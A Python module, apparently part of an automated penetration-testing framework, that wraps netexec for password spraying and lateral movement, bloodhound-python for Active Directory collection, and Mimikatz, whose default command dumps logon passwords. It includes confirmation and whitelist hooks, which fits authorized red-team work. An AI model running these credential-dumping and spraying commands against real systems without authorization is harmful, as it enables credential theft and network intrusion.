"""
横向移动专项执行器

- NetExecExecutor：netexec(nxc，原 crackmapexec) 密码喷洒 / SMB/WinRM/SSH 横向
- BloodHoundCollector：bloodhound-python 采集 AD 域关系
- MimikatzExecutor：Mimikatz 凭据抓取（高危、强杀，慎用）
"""
import logging
from typing import List, Optional

from core.executors.base import ToolExecutor

logger = logging.getLogger(__name__)


class NetExecExecutor(ToolExecutor):
    """netexec 横向 / 密码喷洒"""

    def __init__(
        self,
        protocol: str = "smb",
        timeout: int = 300,
        require_confirmation: bool = True,
        whitelist=None,
        allow_all: bool = False,
        confirm_callback=None,
    ):
        super().__init__(
            tool_name="nxc",
            timeout=timeout,
            require_confirmation=require_confirmation,
            whitelist=whitelist,
            allow_all=allow_all,
            confirm_callback=confirm_callback,
        )
        self.protocol = protocol

    def build_command(self, step_input, step_config) -> Optional[List[str]]:
        host = self._extract_host(step_input.target)
        if not host or not self._validate_host(host):
            return None

        creds = step_input.credentials or {}
        username = creds.get("username") or step_config.get("username") or ""
        password = creds.get("password") or step_config.get("password") or ""
        protocol = step_config.get("protocol") or self.protocol
        module = step_config.get("module") or "shares"

        cmd = ["nxc", protocol, host]
        if username:
            cmd += ["-u", username]
        if password:
            cmd += ["-p", password]
        if module:
            cmd += ["-M", module]
        return cmd


class BloodHoundCollector(ToolExecutor):
    """bloodhound-python 采集域关系（SharpHound 需在域内主机执行）"""

    def __init__(
        self,
        timeout: int = 600,
        require_confirmation: bool = True,
        whitelist=None,
        allow_all: bool = False,
        confirm_callback=None,
    ):
        super().__init__(
            tool_name="bloodhound-python",
            timeout=timeout,
            require_confirmation=require_confirmation,
            whitelist=whitelist,
            allow_all=allow_all,
            confirm_callback=confirm_callback,
        )

    def build_command(self, step_input, step_config) -> Optional[List[str]]:
        host = self._extract_host(step_input.target)
        if not host or not self._validate_host(host):
            return None

        creds = step_input.credentials or {}
        username = creds.get("username") or step_config.get("username") or ""
        password = creds.get("password") or step_config.get("password") or ""
        domain = creds.get("domain") or step_config.get("domain") or ""

        cmd = ["bloodhound-python", "-c", "All", "-u", username, "-p", password, "-ns", host]
        if domain:
            cmd += ["-d", domain]
        return cmd


class MimikatzExecutor(ToolExecutor):
    """Mimikatz 凭据抓取（高危、强杀，慎用）"""

    def __init__(
        self,
        mimikatz_path: str = "mimikatz.exe",
        timeout: int = 300,
        require_confirmation: bool = True,
        whitelist=None,
        allow_all: bool = False,
        confirm_callback=None,
    ):
        super().__init__(
            tool_name="mimikatz.exe",
            timeout=timeout,
            require_confirmation=require_confirmation,
            whitelist=whitelist,
            allow_all=allow_all,
            confirm_callback=confirm_callback,
        )
        self.mimikatz_path = mimikatz_path

    def build_command(self, step_input, step_config) -> Optional[List[str]]:
        host = self._extract_host(step_input.target)
        if not host or not self._validate_host(host):
            return None

        commands = step_config.get("commands") or "privilege::debug sekurlsa::logonpasswords exit"
        path = step_config.get("mimikatz_path") or self.mimikatz_path
        return [path] + [c for c in commands.split() if c]
